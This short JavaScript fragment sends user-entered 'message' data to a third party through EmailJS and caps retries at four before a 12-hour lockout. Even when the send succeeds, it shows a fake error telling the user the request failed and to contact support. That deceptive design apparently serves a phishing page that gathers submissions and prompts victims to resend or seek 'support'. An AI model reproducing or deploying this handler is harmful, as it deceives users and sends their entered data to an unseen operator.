let sendCount = 0;
const sendMessage = (message) => {
    if(sendCount <= 3){
        emailjs.send( SERVICE_ID, TEMPLATE_ID, { message }, API)
        .then(function (response) { // Mail Sent Successfuly
            console.log(response);
            sendCount++;
            alert("[Error:1x45a] Unable to parse request data. Contact Support");
        }, function (error) { // Mail Failed to send
            console.log('FAILED...', error);
            alert("[Error:1x45a] Critical Error: Unable to parse request data. Contact Support");
        });
    }
    else{
        alert("Please wait 12 hours before trying again!!!")
    }
}